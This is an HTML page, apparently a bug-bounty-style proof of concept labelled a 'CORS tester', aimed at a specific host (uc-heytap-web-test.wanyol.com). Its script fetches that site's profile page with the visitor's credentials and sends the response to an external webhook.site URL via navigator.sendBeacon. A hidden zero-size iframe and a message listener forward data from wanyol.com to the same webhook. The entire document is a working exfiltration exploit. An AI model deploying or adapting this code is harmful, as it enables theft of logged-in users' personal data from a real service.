<!DOCTYPE html>
<html>
<body>
<script>
// Enhanced CORS tester with debug output
const targetUrl = 'https://uc-heytap-web-test.wanyol.com/v2/profile.html';
const webhookUrl = 'https://webhook.site/d50f242c-0e3b-4875-b8c8-1cc700fd242b';

fetch(targetUrl, {
  credentials: 'include',
  headers: { 'Origin': 'https://attacker.com' }
})
.then(res => {
  document.write(`<h2>Response Status: ${res.status}</h2>`);
  return res.text();
})
.then(data => {
  document.write(`<pre>${JSON.stringify(data, null, 2)}</pre>`);
  navigator.sendBeacon(webhookUrl, data);
})
.catch(e => {
  document.write(`<pre style="color:red">ERROR: ${e.message}</pre>`);
});
</script>
  <iframe src="https://uc-heytap-web-test.wanyol.com/v2/profile.html" 
        style="width:0;height:0;border:0"></iframe>
<script>
  window.addEventListener('message', (e) => {
    if (e.origin.includes('wanyol.com')) {
      navigator.sendBeacon(webhookUrl, e.data);
    }
  });
</script>
</body>
</html>
